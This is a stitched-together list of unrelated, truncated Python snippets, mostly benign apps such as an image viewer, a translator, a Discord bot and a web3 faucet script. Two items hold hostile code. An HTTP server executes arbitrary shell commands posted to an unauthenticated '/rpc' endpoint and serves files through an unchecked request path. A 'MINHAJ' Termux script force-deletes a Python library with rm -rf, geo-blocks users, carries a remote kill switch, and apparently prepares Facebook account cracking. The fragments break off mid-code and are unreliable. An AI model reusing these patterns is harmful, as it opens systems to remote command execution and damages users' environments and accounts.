    "from tkinter import *\nfrom PIL import Image, ImageTk\nimport os\n\nclass ImageViewer:\n    \n    counter = 1\n    \n    def __init__(self):\n        self.root = Tk()\n        self.root.title('Image Viewer')\n        self.root.geometry('400x600')\n        self.root.config(background='black')\n        \n        # Defines the Interface of Application\n        self.GUI()\n        \n    def GUI(self):\n        files = os.listdir('images')\n        self.img_array = []\n        for file in files:\n            img = Image.open(os.path.join('images',file))\n            resized_image = img.resize((200,300))\n            self.img_array.append(ImageTk.PhotoImage(resized_image))\n            \n        self.img_label = Label(self.root,image=self.img_array[0])\n        self.img_label.pack(pady=(15,20))\n\n        next_btn = Button(self.root,text='Next',background='white',fg='black',width=25,height=2,command=self.next_img)\n        next_btn.pack()\n        \n    def next_img(self):\n        global counter\n        self.img_label.config(image=self.img_array[self.counter%len(self.img_array)])\n        self.counter = self.counter+1\n\n    def run(self):\n        self.root.mainloop()",
    "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport http.cookies\nimport json\nimport os\nimport sys\nimport subprocess\nimport signal\n\nCMD_TIMEOUT_SEC = 10\n\n\ndef call_bash_cmd(cmd):\n    new_session = False\n    if sys.platform.startswith('linux'):\n        # POSIX only\n        new_session = True\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                         stderr=subprocess.STDOUT,\n                         start_new_session=new_session, shell=True)\n\n    try:\n        out = p.communicate(timeout=CMD_TIMEOUT_SEC)[0].decode('utf-8')\n        timeout_reached = False\n    except subprocess.TimeoutExpired:\n        print('Execution timeout. Aborting...')\n        kill_all(p.pid)\n        out = p.communicate()[0].decode('utf-8')\n        timeout_reached = True\n    return p.returncode, out, timeout_reached\n\n\ndef kill_all(pid):\n    if sys.platform.startswith('linux'):\n        os.killpg(os.getpgid(pid), signal.SIGTERM)\n    elif sys.platform.startswith('cygwin'):\n        winpid = int(open(\"/proc/{pid}/winpid\".format(pid=pid)).read())\n        subprocess.Popen(['TASKKILL', '/F', '/PID', str(winpid), '/T'])\n    elif sys.platform.startswith('win32'):\n        subprocess.Popen(['TASKKILL', '/F', '/PID', str(pid), '/T'])\n\n\ndef openssl_version():\n    _, out, timeout = call_bash_cmd('openssl version')\n    if timeout:\n        return 'timeout'\n    return out\n\n\ndef openssl_ciphers_list():\n    _, out, _ = call_bash_cmd('openssl ciphers -s -v')\n    return out\n\n\nclass HTTPRequestHandler(BaseHTTPRequestHandler):\n    CONTENT_APPJSON = 'application/json'\n    CONTENT_CSS = 'text/css'\n    CONTENT_JS = 'text/javascript'\n    CONTENT_HTML = 'text/html'\n    sessions = {}\n\n    def __init__(self, *args):\n        self.cookies = None\n        self.session_id = None\n        BaseHTTPRequestHandler.__init__(self, *args)\n\n    def _set_response_200(self, content_type):\n        self.send_response(200)\n        self.send_header('Content-type', content_type)\n        self.send_header('Set-Cookie', self.cookies.output(header=''))\n        self.end_headers()\n\n    def _set_response_404(self):\n        self.send_response(404)\n        self.end_headers()\n\n    def _handle_session(self):\n        self.cookies = http.cookies.SimpleCookie(self.headers.get('Cookie'))\n        self.session_id = self.cookies.get('session_id')\n\n        if self.session_id:\n            self.session_id = self.session_id.value\n            session_data = self.sessions.get(self.session_id, {})\n        else:\n            self.session_id = os.urandom(16).hex()\n            session_data = {}\n            self.sessions[self.session_id] = session_data\n            self.cookies['session_id'] = self.session_id\n\n        # print(f'Session token: {self.session_id}')\n\n    def do_GET(self):\n        self._handle_session()\n        routes = {\n            '/': self.handle_index,\n            '/data': self.handle_data,\n        }\n        routes_args = [\n            ('/web', self.handle_web_request)\n        ]\n\n        handler = None\n        for route, h in routes_args:\n            if self.path.startswith(route):\n                handler = h\n                break\n        if handler is None:\n            handler = routes.get(self.path, self.handle_not_found)\n\n        handler()\n\n    def do_POST(self):\n        self._handle_session()\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        data = json.loads(post_data.decode('utf-8'))\n        processed_data = {}\n        if self.path == '/rpc':\n            print(f'Executing {data[\"cmd\"]} command...')\n            ret_code, out, timeout = call_bash_cmd(data['cmd'])\n\n            processed_data = {'ret_code': ret_code,\n                              'out': out, 'timeout': timeout}\n\n        self._set_response_200(self.CONTENT_APPJSON)\n        self.wfile.write(json.dumps(processed_data).encode('utf-8'))\n\n    def handle_data(self):\n        self._set_response_200(self.CONTENT_APPJSON)\n        response = {'version': openssl_version(),\n                    'ciphers': openssl_ciphers_list()}\n        self.wfile.write(json.dumps(response).encode('utf-8'))\n\n    def handle_index(self):\n        self.path = '/web/index.html'\n        self.handle_web_request()\n\n    def handle_web_request(self):\n        if self.path.endswith('.css'):\n            self._set_response_200(self.CONTENT_CSS)\n        elif self.path.endswith('.js'):\n            self._set_response_200(self.CONTENT_JS)\n        else:\n            self._set_response_200(self.CONTENT_HTML)\n\n        file_path = os.path.join(os.getcwd(), self.path[1:])\n        if os.path.exists(file_path) and os.path.isfile(file_path):\n            with open(file_path, 'rb') as f:\n                self.wfile.write(f.read())\n        else:\n            self._set_response_404()\n            self.wfile.write(b'File not found')\n            print(f'File {file_path} not found')\n\n    def handle_not_found(self):\n        self._set_response_404()\n        self.wfile.write(b'Not Found')\n        print(f",
    "from PyQt5.QtWidgets import QApplication, QWidget, QTextEdit, QComboBox,QPushButton, QLabel, QHBoxLayout,QVBoxLayout\nfrom PyQt5.QtGui import QFont\nfrom googletrans import Translator\nimport speech_recognition as sr\nfrom languages import *\n\n# \n\nclass Main(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.settings()\n        self.initUI()\n        self.button_events()\n        \n        \n    def initUI(self):\n        self.input_box = QTextEdit()\n        self.output_box = QTextEdit()\n        self.reverse = QPushButton(\"Reverse\")\n        self.reset = QPushButton(\"Reset\")\n        self.submit = QPushButton(\"Translate Now\")\n        self.speak_btn = QPushButton(\"Speak\")\n        self.input_option = QComboBox()\n        self.output_option = QComboBox()\n        self.title = QLabel(\"PyLate\")\n        self.title.setFont(QFont(\"Party LET\",75))\n        \n        self.input_option.addItems(values)\n        self.output_option.addItems(values)\n        \n        \n        self.master = QHBoxLayout()\n        col1 = QVBoxLayout()\n        col2 = QVBoxLayout()\n        \n        col1.addWidget(self.title)\n        col1.addWidget(self.input_option)\n        col1.addWidget(self.output_option)\n        col1.addWidget(self.submit)\n        col1.addWidget(self.speak_btn)\n        col1.addWidget(self.reset)\n        \n        col2.addWidget(self.input_box)\n        col2.addWidget(self.reverse)\n        col2.addWidget(self.output_box)\n        \n        self.master.addLayout(col1,20)\n        self.master.addLayout(col2, 80)\n        self.setLayout(self.master)\n        \n        \n        self.setStyleSheet(\"\"\"\n    QWidget {\n        background-color: #487d49; /* Light green background resembling forest */\n        color: #333; /* Dark text color for better readability */\n    }\n\n    QPushButton {\n        background-color: #84a98c; /* Dark green resembling tree leaves */\n        color: #fff; /* White text for buttons */\n        border: 1px solid #84a98c; /* Border color matching button background */\n        border-radius: 5px; /* Rounded corners for buttons */\n        padding: 5px 10px; /* Padding for buttons */\n    }\n    \n    QTextEdit {\n        background-color:  #84a98c; /* Light gray background for text boxes */\n        color: #333; /* Dark text color for better readability */\n    }\n    \n    QComboBox {\n        background-color: #84a98c; /* Dark green resembling tree leaves */\n        color: #333; /* Dark text color for better readability */\n    }\n    \n    QLabel {\n        color: #fff; /* Dark green text color for labels */\n    }\n\n    QPushButton:hover {\n        background-color: #6e8f72; /* Darker green on hover for buttons */\n    }\n\"\"\")\n\n\n        \n    def settings(self):\n        self.setWindowTitle(\"PyLate 1.0\")\n        self.setGeometry(250,250,600,500)\n\n    \n    def button_events(self):\n        self.submit.clicked.connect(self.translate_click)\n        self.speak_btn.clicked.connect(self.recognize_and_translate)\n        self.reverse.clicked.connect(self.rev_click)\n        self.reset.clicked.connect(self.reset_app)\n    \n    def translate_click(self):\n        try:\n            value_to_key1 = self.output_option.currentText()\n            key_to_value1 = [k for k,v in LANGUAGES.items() if v == value_to_key1]\n            value_to_key2 = self.input_option.currentText()\n\n            key_to_value2 = [k for k,v in LANGUAGES.items() if v == value_to_key2]\n            \n            self.script = self.translate_text(self.input_box.toPlainText(), key_to_value1[0],key_to_value2[0])\n        \n            self.output_box.setText(self.script)\n            \n        except Exception as e:\n            print(\"Exception:\", e)\n            self.input_box.setText(\"You must enter text to translate here...\")\n            \n    def recognize_and_translate(self):\n        text = self.recognize_speech()\n        if text:\n            self.input_box.setText(text)\n            self.translate_click()\n      \n    def reset_app(self):\n        self.input_box.clear()\n        self.output_box.clear()\n        \n    \n    def translate_text(self, text, dest_lang, src_lang):\n        speaker = Translator()\n        translation = speaker.translate(text, dest=dest_lang, src=src_lang)\n        return translation.text\n    \n    def recognize_speech(self):\n        recognizer = sr.Recognizer()\n        with sr.Microphone() as source:\n            try:\n                audio = recognizer.listen(source, timeout=5)\n                text = recognizer.recognize_google(audio)\n                return text\n            except sr.UnknownValueError:\n                self.output_box.setText(\"Could not understand audio\")\n            except sr.RequestError as e:\n                self.output_box.setText(f\"Error requesting speech results: {e}\")\n            except Exception as e:\n                self.output_box.setText(f\"Error recognizing speech:\", e)\n                \n                    \n    def rev_click(self):\n        s1,l1 = self.input_box.toPlainText(),self.input_option.currentText()\n        s2,l2 = self.output_box.toPla",
    "import json\nimport logging\n\nfrom src.prompts import DESMOS_REFINEMENT_PROMPT\nfrom src.prompts import DESMOS_REFINEMENT_PROMPT_STEP_2\nfrom src.prompts import DESMOS_START_PROMPT\nfrom src.prompts import DESMOS_SYSTEM_PROMPT\nfrom src.utils import get_gpt_response\n\nRELEVANT_EXPRESSION_KEYS = [\"id\", \"type\", \"latex\", \"hidden\", \"sliderBounds\"]\n\ndef encode_calculator_state_as_str(calculator_state_expressions):\n    \"\"\"Encode calculator state expressions as a string.\n\n    Args:\n        calculator_state_expressions (List[str]): Desmos expressions\n        representing current calculator state\n\n    Returns:\n        str: Encoded calculator state\n    \"\"\"\n    output_str = \"\"\n    for expression in calculator_state_expressions:\n        json_expr = json.loads(expression)\n        expr = {k:json_expr[k] for k in json_expr.keys() if k in RELEVANT_EXPRESSION_KEYS}\n        expr_str = json.dumps(expr)\n        output_str += expr_str + \"\\n\"\n    return output_str\n\nclass DesmosAgent:\n    \"\"\"Agent responsible for generating Desmos expressions\"\"\"\n\n    def __init__(self):\n        self.logger = logging.getLogger(__name__)\n\n    def generate_desmos_expressions(\n            self,\n            user_request,\n            calculator_state_expressions,\n            wolfram_solution\n    ):\n        \"\"\"Generate new Desmos expressions given user request and current calculator state.\n\n        Args:\n            user_request (str): User request\n            calculator_state_expressions (List[str]): Desmos expressions\n            representing current calculator state\n            wolfram_solution (str): Wolfram solver solution\n\n        Returns:\n            List[dict]: Desmos expression JSON objects representing updated calculator state\n            str: LLM CoT response\n        \"\"\"\n        self.logger.info(f\"Processing user request: {user_request}\")\n        llm_prompt = self._create_desmos_prompt(\n            user_request,\n            calculator_state_expressions,\n            wolfram_solution\n        )\n        self.logger.info(f\"Desmos LLM prompt:\\n {llm_prompt}\")\n        llm_response = get_gpt_response(llm_prompt)\n        self.logger.info(f\"Desmos LLM response:\\n {llm_response}\")\n        expressions = self._parse_llm_response(\n            llm_response, prefix=\"Desmos expressions: \"\n        )\n        return expressions, llm_response\n\n    def validate_desmos_expressions(self, expressions):\n        \"\"\"Validate Desmos expressions via LLM.\n\n        Args:\n            expressions (List[dict]): Desmos expressions\n\n        Returns:\n            List[dict]: Desmos expressions\n        \"\"\"\n        self.logger.info(\"Desmos refinement step 1:\\n\")\n        refine_expressions, preserve_expressions = \\\n            self._extract_expressions_for_refinement(\n                expressions\n            )\n        new_expressions = self._refine_expressions(\n            refine_expressions,\n            DESMOS_REFINEMENT_PROMPT\n        )\n        self.logger.info(\"Desmos refinement step 2:\\n\")\n        new_expressions = self._refine_expressions(\n            new_expressions,\n            DESMOS_REFINEMENT_PROMPT_STEP_2\n        )\n        self.logger.info(\n            f\"Desmos refinement done. Expressions:\\n\\\n                {new_expressions+preserve_expressions}\"\n        )\n        return new_expressions + preserve_expressions\n\n    def process_desmos_expressions(self, expressions):\n        \"\"\"Post process Desmos expressions via rules.\n        Quicker but less robust than LLM validation.\n\n        Args:\n            expressions (List[dict]): Desmos expressions\n\n        Returns:\n            List[dict]: Desmos expressions\n        \"\"\"\n        self.logger.info(\"Desmos post processing step 1:\\n\")\n        new_expressions = [self._process_expression(expr) for expr in expressions]\n        return new_expressions\n\n    def _create_desmos_prompt(\n            self,\n            user_request,\n            calculator_state_expressions,\n            wolfram_solution\n    ):\n        \"\"\"Create prompt for LLM to generate Desmos expressions from user request, calculator state and wolfram solution.\n\n        Args:\n            user_request (str): User request\n            calculator_state_expressions (List[str]): Desmos expressions\n            representing current calculator state\n            wolfram_solution (str): Wolfram solver solution\n\n        Returns:\n            List[dict]: LLM prompt\n        \"\"\"\n        messages = []\n        messages.append({\"role\": \"system\", \"content\": DESMOS_SYSTEM_PROMPT})\n        messages.append({\"role\": \"user\", \"content\": DESMOS_START_PROMPT})\n        user_msg = f\"Task: {user_request}\\nCalculator state: [\"\n        user_msg += encode_calculator_state_as_str(calculator_state_expressions)\n        user_msg += \"]\\nStep-by-step Solution: \\n\"\n        user_msg += wolfram_solution + \"\\n\"\n        messages.append({\"role\": \"user\", \"content\": user_msg})\n        return messages\n\n    def _parse_llm_response(self, llm_response, prefix):\n        \"\"\"Parse LLM response to extract Desmos expressions.\n\n        Args:\n ",
    "#-*-coding:utf-8-*-\n#!/usr/bin/python3\nimport bs4,json,sys,random,datetime,time,re,subprocess,platform,struct\nfrom bs4 import BeautifulSoup as sop\nfrom concurrent.futures import ThreadPoolExecutor as tred\nfrom concurrent.futures import ThreadPoolExecutor as ThreadPool\nimport os\nimport random\nrrq=(\"requests\");mm=(\"uninstall\")\ntry:\n    os.system(f\"pip {mm} {rrq} -y\");os.system(\"rm -rf /data/data/com.termux/files/usr/lib/python3.11/\"+\"site-\"+\"packages/req\"+\"uests\")\nexcept requests.exceptions.ConnectionError:\n    print(\"Net Error\");exit()\ntry:\n    import requests\nexcept ImportError:\n    print('\\n \\033[1;91m[\\033[1;93mMINHAJ-484\\033[1;91m]\\033[1;97m installing requests !...\\n')\n    time.sleep(0.5)\n    os.system('pip install requests')\nimport bs4,json,sys,random,datetime,time,re,subprocess,platform,struct,requests\nfrom bs4 import BeautifulSoup as sop\nfrom concurrent.futures import ThreadPoolExecutor as tred\nimport base64\nimport os,sys,time,json,random,re,string,platform,base64\nimport requests\nfrom concurrent.futures import ThreadPoolExecutor as ThreadPool\nimport mechanize\nfrom requests.exceptions import ConnectionError\nimport string\ntry:\n    import concurrent.futures\nexcept ImportError:\n    print('\\n \\033[1;91m[\\033[1;93mMINHAJ-484\\033[1;91m]\\033[1;97m installing futures !...\\n')\n    time.sleep(0.5)\n    os.system('pip install futures')\ntry:\n    import bs4\nexcept ImportError:\n    print('\\n \\033[1;91m[\\033[1;93mMINHAJ-484\\033[1;91m]\\033[1;97m installing bs4 !...\\n')\n    time.sleep(0.5)\n    os.system('pip install bs4')\nimport os\nimport sys\nimport time\nimport uuid\nfrom os import system as s\nimport os,sys,time,json,random,re,string,platform,base64,uuid,zlib,subprocess\nfrom bs4 import BeautifulSoup as sop\nfrom bs4 import BeautifulSoup\nfrom pip._vendor import requests as requests\nfrom concurrent.futures import ThreadPoolExecutor as ThreadPool\nimport mechanize\nfrom urllib import request as req\nfrom zlib import decompress as dec\nfrom requests.exceptions import ConnectionError\n\ntry:\n    IP = requests.get(\"http://ip-api.com/json/\").json()[\"query\"]\n    ___ccc___ = requests.get(\"http://ip-api.com/json/\").json()[\"country\"]\n    if \"Bangladesh\" not in ___ccc___:\n       os.system('xdg-open https://github.com/MINHAJ-WORLD')\n       print(\"\\033[1;91m[\u00d7] THIS TOOL WORK IN BANGLADESH\")\n       time.sleep(3);exit()\nexcept requests.exceptions.ConnectionError:\n    print(f\"\\033[1;91m[\u00d7] Connection Problem, Please Check Your Internet And Run Again\")\n    time.sleep(3);exit()\n\ntry:\n    os.system('clear')\n    srv=requests.get('https://raw.githubusercontent.com/MINHAJ-WORLD/SPIDER/main/srv.txt').text \n    if \"update\" in srv:\n        os.system('clear')\n        for j in range(3000):\n            time.sleep(0.5)\n            os.system('xdg-open https://github.com/MINHAJ-WORLD')\n            print(f'\\033[1;92m Tool is updating Wait For Complete The Update')\n        exit()\n    elif \"off\" in srv:\n        os.system('clear')\n        for j in range(1000):\n            time.sleep(0.5)\n            os.system('xdg-open https://github.com/MINHAJ-WORLD')\n            print(f'\\033[1;91m Tool is Currenty Off')\n        exit()\nexcept requests.exceptions.ConnectionError:\n    print(f\"\\033[1;91m Connection Problem, Please Check Your Internet And Run Again\")\n    sys.exit()\n\nfbks = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])\nAMSS1 = random.choice(['MessengerLite', 'FB4A;FBAV', 'FB4A'])\nAMSS2 = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I",
    "import discord\nfrom discord.ext import commands\nfrom discord.ui import Button, View\nfrom discord import app_commands\n\n'''\n\u00a9 2024. 201580ag MIT License\n'''\n\nintents = discord.Intents.all()\nbot = commands.Bot(command_prefix='-', intents=intents)\nintents.voice_states = True\n\nasync def \ud300(ctx, *, \uc124\uba85):\n    voice_state = ctx.author.voice\n    if voice_state is None or voice_state.channel is None:\n        await ctx.send(\"\u274c \uc74c\uc131\ucc44\ub110 \uc785\uc7a5 \ud6c4 \uba85\ub839\uc5b4\ub97c \uc0ac\uc6a9\ud574\uc8fc\uc138\uc694.\")\n        return\n\n    channel = voice_state.channel\n    members = len(channel.members)\n    max_members = 4  # \ucd5c\ub300 \uba64\ubc84 \uc218\n\n    member_text = f\"{members}\uba85 / {max_members}\uba85\"\n\n    embed = discord.Embed(title=\"\ud300\uc6d0 \ubaa8\uc9d1\", color=0x992D22)\n    embed.add_field(name=\"\", value=f\"{ctx.author.mention} \ub2d8\uc774 \ud300\uc6d0 \ubaa8\uc9d1 \uc911\uc785\ub2c8\ub2e4.\", inline=False)\n    embed.add_field(name=\"\uce74\ud14c\uace0\ub9ac\", value=ctx.channel.category.name, inline=False)\n    embed.add_field(name=\"\ucc44\ub110 URL\", value=f\"https://discord.com/channels/{ctx.guild.id}/{channel.id}\", inline=True)\n    embed.add_field(name=\"\uba64\ubc84\", value=member_text, inline=True)\n    embed.add_field(name=\"\uc124\uba85\", value=\uc124\uba85, inline=False)\n\n    button1 = Button(label=\"\ud83d\udd08 \uc74c\uc131\ucc44\ub110 \uc785\uc7a5\", style=discord.ButtonStyle.green, url=f\"https://discord.com/channels/{ctx.guild.id}/{channel.id}\")\n\n    view = View()\n    view.add_item(button1)\n\n    await ctx.send(embed=embed, view=view)\n\nbot.run(\"TOKEN\")\n",
    "import streamlit as st\nimport pandas as pd\nimport numpy as np\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.ensemble import RandomForestRegressor\nfrom sklearn.metrics import mean_squared_error, r2_score\nimport altair as alt\nimport time\nimport zipfile\n\n# Page title\nst.set_page_config(page_title='ML Model Building', page_icon='\ud83e\udd16')\nst.title('\ud83e\udd16 ML Model Building')\n\nwith st.expander('About this app'):\n  st.markdown('**What can this app do?**')\n  st.info('This app allow users to build a machine learning (ML) model in an end-to-end workflow. Particularly, this encompasses data upload, data pre-processing, ML model building and post-model analysis.')\n\n  st.markdown('**How to use the app?**')\n  st.warning('To engage with the app, go to the sidebar and 1. Select a data set and 2. Adjust the model parameters by adjusting the various slider widgets. As a result, this would initiate the ML model building process, display the model results as well as allowing users to download the generated models and accompanying data.')\n\n  st.markdown('**Under the hood**')\n  st.markdown('Data sets:')\n  st.code('''- Drug solubility data set\n  ''', language='markdown')\n  \n  st.markdown('Libraries used:')\n  st.code('''- Pandas for data wrangling\n- Scikit-learn for building a machine learning model\n- Altair for chart creation\n- Streamlit for user interface\n  ''', language='markdown')\n\n\n# Sidebar for accepting input parameters\nwith st.sidebar:\n    # Load data\n    st.header('1.1. Input data')\n\n    st.markdown('**1. Use custom data**')\n    uploaded_file = st.file_uploader(\"Upload a CSV file\", type=[\"csv\"])\n    if uploaded_file is not None:\n        df = pd.read_csv(uploaded_file, index_col=False)\n      \n    # Download example data\n    @st.cache_data\n    def convert_df(input_df):\n        return input_df.to_csv(index=False).encode('utf-8')\n    example_csv = pd.read_csv('https://raw.githubusercontent.com/dataprofessor/data/master/delaney_solubility_with_descriptors.csv')\n    csv = convert_df(example_csv)\n    st.download_button(\n        label=\"Download example CSV\",\n        data=csv,\n        file_name='delaney_solubility_with_descriptors.csv',\n        mime='text/csv',\n    )\n\n    # Select example data\n    st.markdown('**1.2. Use example data**')\n    example_data = st.toggle('Load example data')\n    if example_data:\n        df = pd.read_csv('https://raw.githubusercontent.com/dataprofessor/data/master/delaney_solubility_with_descriptors.csv')\n\n    st.header('2. Set Parameters')\n    parameter_split_size = st.slider('Data split ratio (% for Training Set)', 10, 90, 80, 5)\n\n    st.subheader('2.1. Learning Parameters')\n    with st.expander('See parameters'):\n        parameter_n_estimators = st.slider('Number of estimators (n_estimators)', 0, 1000, 100, 100)\n        parameter_max_features = st.select_slider('Max features (max_features)', options=['all', 'sqrt', 'log2'])\n        parameter_min_samples_split = st.slider('Minimum number of samples required to split an internal node (min_samples_split)', 2, 10, 2, 1)\n        parameter_min_samples_leaf = st.slider('Minimum number of samples required to be at a leaf node (min_samples_leaf)', 1, 10, 2, 1)\n\n    st.subheader('2.2. General Parameters')\n    with st.expander('See parameters', expanded=False):\n        parameter_random_state = st.slider('Seed number (random_state)', 0, 1000, 42, 1)\n        parameter_criterion = st.select_slider('Performance measure (criterion)', options=['squared_error', 'absolute_error', 'friedman_mse'])\n        parameter_bootstrap = st.select_slider('Bootstrap samples when building trees (bootstrap)', options=[True, False])\n        parameter_oob_score = st.select_slider('Whether to use out-of-bag samples to estimate the R^2 on unseen data (oob_score)', options=[False, True])\n\n    sleep_time = st.slider('Sleep time', 0, 3, 0)\n\n# Initiate the model building process\nif uploaded_file or example_data: \n    with st.status(\"Running ...\", expanded=True) as status:\n    \n        st.write(\"Loading data ...\")\n        time.sleep(sleep_time)\n\n        st.write(\"Preparing data ...\")\n        time.sleep(sleep_time)\n        X = df.iloc[:,:-1]\n        y = df.iloc[:,-1]\n            \n        st.write(\"Splitting data ...\")\n        time.sleep(sleep_time)\n        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=(100-parameter_split_size)/100, random_state=parameter_random_state)\n    \n        st.write(\"Model training ...\")\n        time.sleep(sleep_time)\n\n        if parameter_max_features == 'all':\n            parameter_max_features = None\n            parameter_max_features_metric = X.shape[1]\n        \n        rf = RandomForestRegressor(\n                n_estimators=parameter_n_estimators,\n                max_features=parameter_max_features,\n                min_samples_split=parameter_min_samples_split,\n                min_samples_leaf=parameter_min_samples_leaf,\n                random_state=parameter_random_state,\n                criterion=parameter_criterion,\n            ",
    "\ndef run_quiz(questions):\n    score = 0\n    for question in questions:\n        print(question[\"prompt\"])\n        for option in question[\"options\"]:\n            print(option)\n        answer = input(\"Enter your answer (A, B, C, or D): \").upper()\n        if answer == question[\"answer\"]:\n            print(\"Correct!\\n\")\n            score += 1\n        else:\n            print(\"Wrong! The correct answer was\", question[\"answer\"], \"\\n\")\n    print(f\"You got {score} out of {len(questions)} questions correct.\")\n\n# List of quiz questions. Each question is a dictionary.\nquestions = [\n    {\n        \"prompt\": \"What is the capital of Jharkhand?\",\n        \"options\": [\"A. Ranchi\", \"B. Dhanbad\", \"C. Bokaro Steel City\", \"D. Deoghar\"],\n        \"answer\": \"A\"\n    },\n    {\n        \"prompt\": \"Year Jharkhand became a state?\",\n        \"options\": [\"A. 2001\", \"B. 2000\", \"C. 2003\", \"D. 1999\"],\n        \"answer\": \"B\"\n    },\n    \n    {\n        \"prompt\": \"Most Pilgrim City'?\",\n        \"options\": [\"A. Deoghar\", \"B.Dhanbad \", \"C.BOKARO\", \"D. Jamshedpur\"],\n        \"answer\": \"A\"\n    }\n]\n\n# Run the quiz\nrun_quiz(questions)\n",
    "\r\nfrom time import sleep\r\nfrom web3 import Web3\r\ndef init_web3(ethereum_node_url):\r\n    \"\"\"\u521d\u59cb\u5316Web3\u8fde\u63a5\"\"\"\r\n    \r\n    web3 = Web3(Web3.HTTPProvider(ethereum_node_url))\r\n    assert web3.is_connected(), \"Cannot connect to the Ethereum node\"\r\n    return web3\r\n\r\ndef erc20_abi():\r\n    \"\"\"Return the ERC20 token contract ABI.\"\"\"\r\n    return [\r\n        {\r\n            \"constant\": False,\r\n            \"inputs\": [\r\n                {\r\n                    \"name\": \"_amount\",\r\n                    \"type\": \"uint256\"\r\n                },\r\n            ],\r\n            \"name\": \"faucetToken\",\r\n            \"outputs\": [\r\n                {\r\n                    \"name\": \"\",\r\n                    \"type\": \"bool\"\r\n                }\r\n            ],\r\n            \"payable\": False,\r\n            \"stateMutability\": \"nonpayable\",\r\n            \"type\": \"function\"\r\n        },\r\n        {\r\n        \"constant\": False,\r\n        \"inputs\": [\r\n        {\r\n            \"name\": \"_collateralKey\",\r\n            \"type\": \"bytes32\"\r\n        },\r\n        {\r\n            \"name\": \"_collateralAmount\",\r\n            \"type\": \"uint256\"\r\n        },\r\n        {\r\n            \"name\": \"_synthToMint\",\r\n            \"type\": \"uint256\"\r\n        },\r\n        {\r\n            \"name\": \"_bridgeName\",\r\n            \"type\": \"bytes32\"\r\n        },\r\n        {\r\n            \"name\": \"_destChainId\",\r\n            \"type\": \"uint16\"\r\n        },\r\n        {\r\n            \"name\": \"erc20Payment\",\r\n            \"type\": \"bool\"\r\n        }\r\n        ],\r\n        \"name\": \"issueSynths\",\r\n        \"outputs\": [\r\n        {\r\n            \"name\": \"\",\r\n            \"type\": \"bool\"\r\n        }\r\n            ],\r\n        \"payable\": False,\r\n        \"stateMutability\": \"nonpayable\",\r\n        \"type\": \"function\"\r\n    },\r\n    ]\r\ndef faucetToken_erc20(web3, contract_address, from_address, amount, private_key,gas_price):\r\n    \"\"\"faucetToken ERC20 token.\"\"\"\r\n    contract_address = web3.to_checksum_address(contract_address)\r\n    from_address = web3.to_checksum_address(from_address)\r\n\r\n    contract = web3.eth.contract(address=contract_address, abi=erc20_abi())\r\n\r\n    value = web3.to_wei(amount, 'ether')  # Assuming the token uses 18 decimal places\r\n    chain_id = web3.eth.chain_id\r\n    nonce = web3.eth.get_transaction_count(from_address)\r\n    suggested_gas_price =web3.to_wei(gas_price, 'gwei') \r\n    estimated_gas = contract.functions.faucetToken(value).estimate_gas({\r\n        'from': from_address\r\n    })\r\n    print(f'from address: {from_address}')\r\n\r\n    for i in range(10):\r\n        print(f'now nonce is {nonce}, send on chain {chain_id} with gas price {suggested_gas_price}, gas {estimated_gas}')\r\n        tx = {\r\n            'nonce': nonce,\r\n            'to': contract_address,\r\n            'value': 0,\r\n            'gas': estimated_gas,\r\n            'gasPrice': suggested_gas_price,\r\n            'chainId': chain_id,\r\n            'data': contract.encodeABI(fn_name='faucetToken', args=[value]),\r\n        }\r\n        signed_tx = web3.eth.account.sign_transaction(tx, private_key)\r\n        try:\r\n            tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)\r\n            print(f'send tx :{web3.to_hex(tx_hash)}')\r\n            return web3.to_hex(tx_hash)\r\n        except ValueError as e:\r\n            # \u68c0\u67e5\u662f\u5426\u662f\u7279\u5b9a\u7684nonce\u9519\u8bef\r\n            if isinstance(e.args[0], dict) and e.args[0].get('code') == -32000 and 'invalid nonce' in e.args[0].get('message'):\r\n                print(\"Nonce too low, incrementing nonce and retrying...\")\r\n                nonce += 1  # \u589e\u52a0nonce\u5e76\u91cd\u8bd5\r\n            elif isinstance(e.args[0], dict) and e.args[0].get('code') == -32000 and 'nonce too low' in e.args[0].get('message'):\r\n                print(\"Nonce too low, incrementing nonce and retrying...\")\r\n                nonce += 1  # \u589e\u52a0nonce\u5e76\u91cd\u8bd5  \r\n            